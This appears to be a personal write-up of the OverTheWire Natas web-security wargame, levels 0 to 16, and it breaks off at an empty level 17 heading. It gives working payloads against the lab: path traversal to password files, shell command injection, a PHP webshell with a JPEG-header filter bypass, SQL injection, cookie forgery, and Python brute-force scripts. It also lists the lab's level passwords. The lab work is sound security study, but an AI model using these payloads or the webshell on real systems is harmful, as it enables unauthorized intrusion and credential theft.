# 0

Given:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Looking at the full page source we can find the password at line 16.

```html
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
```

# 1

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org
```

Same as before, but just shift+right click on firefox.

```html
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
```

# 2

```
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org
```

There is nothing in this page except for `<img src="files/pixel.png">`. The image is not interesting, but going to the files directory shows a list of files, one being `users.txt`, which includes the password.

```
# username:password
...
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

# 3

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org
```

The source code mentions `Not even Google will find it this time...` which means that the website is hiding certain directories from appearing in search engines. Checking robots.txt we can find this:

> User-agent: *
> Disallow: /s3cr3t/

Checking s3cr3t directory you can use the same method as natas2 as it includes users.txt.

```
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

# 4

```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
```

We get denied access when visiting the website, saying that `authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`. However we don't have access to natas5 yet, so we have to change the referer header when visiting the website.

Normally you can use burpsuite, but i found a firefox addon called [Referer Modifier](https://addons.mozilla.org/en-US/firefox/addon/referer-modifier/) by Airtower that would let me set the referer as `http://natas5.natas.labs.overthewire.org/` on any website. When doing so we can finally see the password.

```
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 
```

# 5

```
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org
```

It says we aren't logged in. There's no other way to log in. I checked for any stored data using a cookie editor addon such as [Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/), and I found out that there is one boolean cookie named `loggedin` which is set to 0. I set it to 1 which means that I am now considered logged in after refreshing the page.

```
Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

# 6

```
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
```

It asks us for a secret key. It also gives us the PHP source code of the checker, which mentions ``include "includes/secret.inc";``. Visiting that file gives us the secret key. (Make sure to view source)

> $secret = "FOEIUWGHFEEUHOFUOIU";

Input that and we get the password.

```
Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 
```

# 7

```
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org
```

The hint in the source code says `password for webuser natas8 is in /etc/natas_webpass/natas8` but going to that directory doesn't work. But clicking on the website buttons take you to `index.php?page=home` and `index.php?page=about` respectiely. So going to `index.php?page=/etc/natas_webpass/natas8` gives us the password.

```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```

# 8

```
Username: natas8
URL:      http://natas8.natas.labs.overthewire.org
```

The PHP source code provides the secret key, but it is encoded with a function that is also given.

> ```php
> $encodedSecret = "3d3d516343746d4d6d6c315669563362";
> 
> function encodeSecret($secret) {
>     return bin2hex(strrev(base64_encode($secret)));
> }
> ```

The function first encodes the secret key into base64, then reverses it, and finally converts it to hexadecimal. To get the secret key we should do this backwards.

1. Convert `3d3d516343746d4d6d6c315669563362` hex into ascii: `==QcCtmMml1ViV3b`

2. Reverse the string: `b3ViV1lmMmtCcQ==`

3. Decode the base64: `oubWYf2kBq`

Enter the key and you will get the password

```
Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd 
```

# 9

```
Username: natas9
URL:      http://natas9.natas.labs.overthewire.org
```

The program provides source code:

> ```php
> if($key != "") {
>     passthru("grep -i $key dictionary.txt");
> }
> ```

Basically all it does is return all the lines in dictionary.txt that partly contain the input. We can use this to print out the password for the next level, by printing the file `/etc/natas_webpass/natas10` instead, and commenting the rest of the string out using `#`. Also, entering `.` prints out the entire file. So i entered in `. /etc/natas_webpass/natas10 #` to get the password.

```
Output:

D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

# 10

```
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
```

I guess the filter is broken, because our previous solution still works: `. /etc/natas_webpass/natas11 #`

```
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

# 11

```
Username: natas11
URL:      http://natas11.natas.labs.overthewire.org
```

The website stores a `data` cookie with the value `MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D`.

Looking at the source code, it seems that the cookie is actually an array that stores the background color `bgcolor` as well as `showpassword`, but interpreted in JSON text format. The text is run through the xor_encrypt function, which xor's every letter by a secret key text. The result is then coverted into base64 and stored as the cookie. 

Since our cookie is based on the default array which is given: 

> $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

we need to pass a cookie that has `showpassword` as `yes` so we can get the password.

The first thing we need to do however is get the key, we can do this by xoring the cookie by the default array in JSON. (We're going to use PHP for this one)

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")); 
> $key = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D");
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print $outText;
> print "\n";
> ?>
> ```

The key repeats, so the result is actually `KNHL`. With this we can place the key accordingly to get a cookie with the value.

> ```php
> <?php
> $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")); 
> $key = "KNHL";
> $outText = '';
> for ($i=0;$i<strlen($text);$i++) {
>   $outText .= $text[$i] ^ $key[$i % strlen($key)];
> }
> print base64_encode($outText);
> print "\n";
> ?>
> ```

We get our new cookie! `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz`

Put this in your cookie editor and refresh the page.

```
The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```

# 12

```
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
```

We get to input JPEG files. When I input a file, it seems that the only thing it checks for is if the file exceeds 1kb in size, otherwise it uploads and becomes accessible through the website. 

What we should upload instead is a PHP file that lets us execute shell commands through the website. A PHP webshell I found was ``<?php echo passthru($_GET['cmd']); ?>``, just put that on a file.

However, it renames the file with a random string and puts .jpg in the end. Looking through the source code it seems that the new filename is generated when we visit the site, and is stored on the html at line 17.

> `<input type="hidden" name="filename" value="uxt1svx2ok.jpg" />`

So all we have to do is inspect element and change the .jpg to .png.

Once we upload the file, we can run the file by clicking the link. We can then add `?cmd=cat /etc/natas_webpass/natas13` after the file name to see the password.

```
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```

# 13

```
Username: natas13
URL:      http://natas13.natas.labs.overthewire.org
```

The code now uses exif to check what file type it is. Basically checking the first few bytes and seeing whether it matches for a jpeg file.  The signature is `FF D8 FF E0`, we need a way to put that on our PHP file from last level. I used this python code to do this.

> ```python
> hex_jpeg = bytearray([0xFF, 0xD8, 0xFF, 0xE0])
> code = "<?php echo passthru($_GET['cmd']); ?>"
> with open('newCode.php', 'wb') as file:
>     file.write(hex_jpeg)
>     file.write(code.encode('utf-8'))
> ```

Once that's done, just follow the same steps as the previous level. Make sure you don't pick up the first four characters. (They may appear as a diamond with a question mark)

```
���� qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP 
```

# 14

```
Username: natas14
URL:      http://natas14.natas.labs.overthewire.org
```

The website is using SQL to get a username and password onto the website. Looking onto the source code it seems that the query is displayed like this:

> `SELECT * from users where username="(user)"and password="(pass)";`

Since we can put anything on the input, you can just leave the username blank, and put `"  or "1"="1` as our password. Basically by doing this, we get all the users on the site which is more than 0 rows needed to get the success message.

```
Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```

# 15

```
Username: natas15
URL:      http://natas15.natas.labs.overthewire.org
```

The website uses SQL to check if a user exists. Just like the previous level, the input is unfiltered, but it looks like we need to brute force the password ourselves. We can use `natas16` as the user because it exists.

Instead of using the text box we can use the URL instead. After the index.php, we can try doing  `SELECT * from users where username="natas16" and password LIKE BINARY "(pass)%"`. The LIKE BINARY will help us compare the password input case-sensitively, and the % key will fill out the rest of the password, so we can brute force every character until we get the full password.  We can tell if it works because it will say "This user exists", while incorrect passwords are "This user doesn't exist". 

For the sake of time I just looked for other solutions for this level and took [this person's code.](https://github.com/psmiraglia/ctf/blob/master/overthewire/natas/natas15.md) Brute forcing itself is time consuming anyway. Here's the python code.

> ```python
> import requests
> target = 'http://natas15.natas.labs.overthewire.org'
> charset_0 = (
> 	'0123456789' +
> 	'abcdefghijklmnopqrstuvwxyz' +
> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
> charset_1 = ''
> for c in charset_0:
> 	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
> 	r = requests.get(target,
> 		auth=webauth,
> 		params={"username": username}
> 	)
> 	if "This user exists" in r.text:
> 		charset_1 += c
> 		print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))
> 
> password = ""
> while len(password) != 32:
> 	for c in charset_1:
> 		t = password + c
> 		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
> 		r = requests.get(target,
> 			auth=webauth,
> 			params={"username": username}
> 		)
> 		if "This user exists" in r.text:
> 			print ('PASS: ' + t.ljust(32, '*'))
> 			password = t
> 			break
> ```

Once that's done we get the password.

```
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
```

# 16

```
Username: natas16
URL:      http://natas16.natas.labs.overthewire.org
```

So this one is like natas10 except it filters out even more characters, so now our solution finally doesn't work. But Bash also allows us to execute commands inside a command using `$(cmd)`, which is not blocked in the website. So if we did something like `$(echo hello)helium`, it will end up being`hello helium`and return no result.

Looks like we need to bruteforce again... so the command we will use is `(grep -E ^(pass).* /etc/natas_webpass/natas17)helium`. This lets us run a regex expression that runs successfully if the starting characters, `(pass)`, match the start of the password. If it does, it will return a blank message, but wrong characters will just return the words with helium.

I used the same python code from the previous level, but with some changes.

> ```python
> import requests
> target = 'http://natas16.natas.labs.overthewire.org'
> charset_0 = (
> 	'0123456789' +
> 	'abcdefghijklmnopqrstuvwxyz' +
> 	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
> )
> webauth = ('natas16','TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
> charset_1 = ''
> 
> for c in charset_0:
> 	username = ('$(grep ' + c +' /etc/natas_webpass/natas17)helium')
> 	r = requests.get(target,
> 		auth=webauth,
> 		params={"needle": username}
> 	)
> 	if "helium" not in r.text:
> 		charset_1+=c
> 		print ('CSET: ' + charset_1.ljust(32, '*'))
> 
> password = ""
> while len(password) != 32:
> 	for c in charset_1:
> 		t = password + c
> 		username = ('$(grep -E ^' + t +'.* /etc/natas_webpass/natas17)helium')
> 		r = requests.get(target,
> 			auth=webauth,
> 			params={"needle": username}
> 		)
> 		if "helium" not in r.text:
> 			print ('PASS: ' + t.ljust(32, '*'))
> 			password = t
> 			break
> ```

This is the password we get:

```
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```

# 17

```
Username: natas17
URL:      http://natas17.natas.labs.overthewire.org
```


